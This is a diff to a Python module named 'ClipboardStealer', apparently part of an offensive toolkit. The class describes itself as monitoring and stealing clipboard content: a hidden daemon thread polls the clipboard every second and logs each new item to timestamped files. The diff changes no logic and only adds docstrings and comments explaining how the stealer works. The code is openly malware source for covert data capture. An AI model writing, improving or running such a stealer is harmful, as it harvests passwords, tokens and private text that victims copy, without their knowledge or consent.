@@ -14,7 +14,7 @@ from datetime import datetime
 
 # Try to import clipboard library
 try:
-    import pyperclip
+    import pyperclip  # Library for clipboard access across platforms
     PYPERCLIP_AVAILABLE = True
 except ImportError:
     PYPERCLIP_AVAILABLE = False
@@ -25,11 +25,23 @@ class ClipboardStealer:
     """Monitor and steal clipboard content"""
     
     def __init__(self, log_dir="logs/clipboard"):
+        """
+        Initialize clipboard stealer
+        
+        Args:
+            log_dir: Directory where clipboard logs will be saved
+        """
+        # Directory to save clipboard logs
         self.log_dir = log_dir
+        # Flag indicating if monitoring is active
         self.is_running = False
+        # Background thread for monitoring clipboard
         self.monitor_thread = None
+        # Last clipboard content seen (to detect changes)
         self.last_content = ""
+        # Path to current log file
         self.log_file = None
+        # How often to check clipboard (in seconds)
         self.check_interval = 1  # Check clipboard every 1 second
         
         # Create log directory if it doesn't exist
@@ -41,7 +53,15 @@ class ClipboardStealer:
         self.log_file = os.path.join(self.log_dir, f"clipboard_{timestamp}.txt")
     
     def start(self):
-        """Start monitoring clipboard"""
+        """
+        Start monitoring clipboard in background thread
+        
+        Creates a daemon thread that continuously monitors clipboard for changes.
+        When content changes, it's automatically logged to file.
+        
+        Returns:
+            Status message indicating success or error
+        """
         if not PYPERCLIP_AVAILABLE:
             return "[!] Clipboard monitoring requires pyperclip. Install with: pip install pyperclip"
         
@@ -50,13 +70,20 @@ class ClipboardStealer:
         
         self.is_running = True
         self.monitor_thread = threading.Thread(target=self._monitor_clipboard)
-        self.monitor_thread.daemon = True
+        self.monitor_thread.daemon = True  # Thread will exit when main program exits
         self.monitor_thread.start()
         
         return f"[+] Clipboard monitoring started. Logging to: {self.log_file}"
     
     def stop(self):
-        """Stop monitoring clipboard"""
+        """
+        Stop monitoring clipboard
+        
+        Signals the monitoring thread to stop and waits for it to finish.
+        
+        Returns:
+            Status message indicating success or error
+        """
         if not self.is_running:
             return "[!] Clipboard monitor is not running"
         
@@ -67,7 +94,12 @@ class ClipboardStealer:
         return "[+] Clipboard monitoring stopped"
     
     def _monitor_clipboard(self):
-        """Monitor clipboard in background thread"""
+        """
+        Monitor clipboard in background thread (internal method)
+        
+        Continuously checks clipboard for changes and logs new content.
+        Runs until is_running flag is set to False.
+        """
         try:
             # Get initial clipboard content
             self.last_content = pyperclip.paste()
@@ -95,7 +127,14 @@ class ClipboardStealer:
             self.is_running = False
     
     def _log_clipboard(self, content):
-        """Log clipboard content to file"""
+        """
+        Log clipboard content to file (internal method)
+        
+        Writes clipboard content with timestamp and formatting to log file.
+        
+        Args:
+            content: Clipboard content to log
+        """
         try:
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             
@@ -111,7 +150,12 @@ class ClipboardStealer:
             print(f"[!] Error logging clipboard: {e}")
     
     def _log_error(self, error_msg):
-        """Log errors to file"""
+        """
+        Log errors to file (internal method)
+        
+        Args:
+            error_msg: Error message to log
+        """
         try:
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             
